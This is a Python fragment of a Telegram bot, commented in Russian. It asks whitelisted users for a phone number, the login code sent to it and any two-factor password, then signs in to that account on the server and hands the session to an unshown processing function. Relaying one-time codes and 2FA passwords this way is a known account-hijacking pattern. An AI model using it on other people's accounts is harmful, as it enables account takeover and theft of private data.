@dp.message_handler(lambda message: message.text and 
                    message.text.startswith('+') and 
                    message.text[1:].isdigit() and 
                    len(message.text) > 10 and 
                    message.from_user.id in allowed_users)
async def get_phone_number(message: types.Message):
    phone_number = message.text
    
    user_state[message.from_user.id] = {'phone_number': phone_number, 'attempts': 0}
    
    try:
        # Создаем новый экземпляр клиента
        client = create_client()
        await client.connect()
        
        # Разлогиниваемся от предыдущего клиента, если он был авторизован
        if await client.is_user_authorized():
            await client.log_out()
        
        phone_code_hash = await client.send_code_request(phone_number)
        user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент в user_state
        await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")

# Ловим сообщение с кодом
@dp.message_handler(lambda message: message.text and 
                    'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                    'awaiting_password' not in user_state.get(message.from_user.id, {}))
async def get_code(message: types.Message):
    code = message.text
    phone_number = user_state[message.from_user.id]['phone_number']
    phone_code_hash = user_state[message.from_user.id]['phone_code_hash'].phone_code_hash
    client = create_client()  # Создаем экземпляр клиента здесь
    try:
        await client.connect()
        # Проверяем, что пин-код состоит из 5 цифр
        if len(code) != 5 or not code.isdigit():
            user_state[message.from_user.id]['attempts'] += 1
            if user_state[message.from_user.id]['attempts'] >= 3:
                raise ValueError("Превышено количество попыток ввода кода. Пожалуйста, попробуйте позже.")
            raise ValueError("Пин-код должен состоять из 5 цифр.")
                
        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
        
        await message.reply("Успешная авторизация!")
        await process_user_data(client, phone_number, message.from_user.id)
        # Сохраняем экземпляр клиента для последующего использования
        user_state[message.from_user.id]['client'] = client
    except SessionPasswordNeededError:
        await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
        user_state[message.from_user.id]['awaiting_password'] = True
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")

@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
async def process_password(message: types.Message):
    password = message.text
    phone_number = user_state[message.from_user.id]['phone_number']
    phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
    client = user_state[message.from_user.id]['client']  # Используем сохраненный экземпляр клиента
    try:
        await client.connect()
        
        await client.sign_in(password=password)
        await message.reply("Успешная авторизация!")
        await process_user_data(client, phone_number, message.from_user.id)
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")
    finally:
        user_state[message.from_user.id]['attempts'] += 1
        if user_state[message.from_user.id]['attempts'] >= 3:
            user_state.pop(message.from_user.id, None)
        await client.log_out()
        await client.disconnect()
